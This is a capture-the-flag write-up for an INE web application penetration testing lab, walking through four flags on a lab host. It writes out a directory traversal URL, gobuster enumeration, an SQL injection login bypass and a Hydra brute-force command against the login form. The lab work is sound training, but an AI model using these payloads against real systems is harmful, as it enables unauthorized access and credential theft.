## Web Application Penetration Testing CTF 1


### Flag 1: Sometimes, important files are hidden in plain sight. Check the root ('/') directory for a file named 'flag.txt' that might hold the key to the first flag.

Following the hint, this flag is quite straightforward.
We can use directory traversal to read the file flag.txt and retrieve the initial flag.
```
http://target.ine.local/view_file?file=../../flag.txt
```

### Flag 2: Explore the structure of the server's directories. Enumeration might reveal hidden treasures.

Enumerating web directory, we find one that might be interesting.
```
gobuster dir -u target.ine.local -w /usr/share/wordlists/dirb/common.txt 
```
```
/secured (Status: 308) [Size: 251] [--> http://target.ine.local/secured/]
```
Inside the folder we found the second flag.
```
http://target.ine.local/secured/flag.txt
```

### Flag 3: The login form seems a bit weak. Trying out different combinations might just reveal the next flag.

We accidentally discovered the fourth flag using an SQL injection.
```
username: ' OR 1=1;--
password: a
```
We can try to use Hydra.
After some research we find out the correct syntax to brute-force the login page.
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```
Finding the credential.
```
guest:butterlfy1
```
Upon logging in, we discovered the third flag.


### Flag 4: The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin' account and find the flag.

Already found.
